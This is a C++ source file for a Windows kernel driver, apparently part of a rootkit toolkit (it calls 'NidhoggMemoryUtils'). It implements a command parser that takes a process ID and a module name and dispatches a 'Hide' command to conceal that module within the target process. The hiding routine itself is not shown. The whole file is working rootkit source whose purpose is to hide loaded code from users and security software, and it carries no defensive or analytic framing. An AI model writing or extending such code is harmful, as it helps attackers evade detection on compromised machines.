#include "pch.h"
#include "ModuleParser.h"
#include "MemoryUtils.hpp"
#include "ProcessUtils.hpp"

ModuleParser::ModuleParser() {
	this->optionsSize = 1;
	this->options = AllocateMemory<OptionMetadata*>(this->optionsSize * sizeof(OptionMetadata));

	if (!this->options)
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);

	this->options[0] = { Options::Hide, { 2, { ArgType::ULong, ArgType::WCharPtr } } };
}

/*
* Description:
* Execute is responsible for executing a command and returning its value.
*
* Parameters:
* @commandId [Options]  -- Command to run.
* @args		 [PVOID*]	-- Array of args to send to the command.
*
* Returns:
* @status	 [NTSTATUS] -- Result of the command.
*/
NTSTATUS ModuleParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
	HiddenModuleInformation hiddenModule{};
	UNICODE_STRING wModuleName = { 0 };
	ANSI_STRING aModuleName = { 0 };
	NTSTATUS status = STATUS_SUCCESS;

	if (!Features.ModuleHiding)
		return STATUS_UNSUCCESSFUL;

	hiddenModule.Pid = *(ULONG*)args[0];

	if (!VALID_PROCESS(hiddenModule.Pid))
		return STATUS_INVALID_PARAMETER;

	// Converting string to unicode.
	RtlInitAnsiString(&aModuleName, (PCHAR)args[1]);
	status = RtlAnsiStringToUnicodeString(&wModuleName, &aModuleName, TRUE);

	if (!NT_SUCCESS(status))
		return status;

	hiddenModule.ModuleName = wModuleName.Buffer;

	switch (commandId) {
	case Options::Hide:
	{
		status = NidhoggMemoryUtils->HideModule(&hiddenModule);
		break;
	}
	default:
	{
		status = STATUS_NOT_IMPLEMENTED;
		break;
	}
	}

	if (hiddenModule.ModuleName)
		RtlFreeUnicodeString(&wModuleName);

	return status;
}
